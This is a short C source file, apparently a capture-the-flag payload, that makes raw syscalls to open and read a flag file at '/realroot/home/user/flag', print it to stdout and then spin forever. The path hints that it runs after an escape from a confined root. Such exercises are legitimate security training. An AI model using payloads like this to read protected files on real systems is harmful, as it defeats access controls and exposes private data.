#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdint.h>

#define AT_FDCWD (-100)
#define O_RDONLY (0)

long syscall_func(long number, ...);

__attribute__((section(".text"))) const char flag_path[] = "/realroot/home/user/flag\x00";

int _start(void)
{
    // Read the flag, and print it to stdout
    char buf[128];
    int flag_fd = syscall_func(__NR_openat, AT_FDCWD, flag_path, O_RDONLY, 0);
    syscall_func(__NR_read, flag_fd, buf, 128);
    syscall_func(__NR_write, 1, buf, 128);

    // Loop forever
    while(1) { ; }
}
